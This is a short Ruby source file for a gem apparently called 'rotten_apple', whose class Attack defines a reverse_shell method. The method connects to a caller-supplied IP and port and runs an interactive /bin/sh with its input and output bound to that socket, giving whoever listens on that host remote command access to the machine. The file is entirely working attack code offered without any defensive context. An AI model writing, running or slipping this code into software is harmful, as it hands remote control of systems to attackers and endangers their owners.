require "rotten_apple/version"
require "socket"

module RottenApple 
  class Attack
    def reverse_shell(ip, port)
      f=TCPSocket.open(ip,port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
    end
  end
end
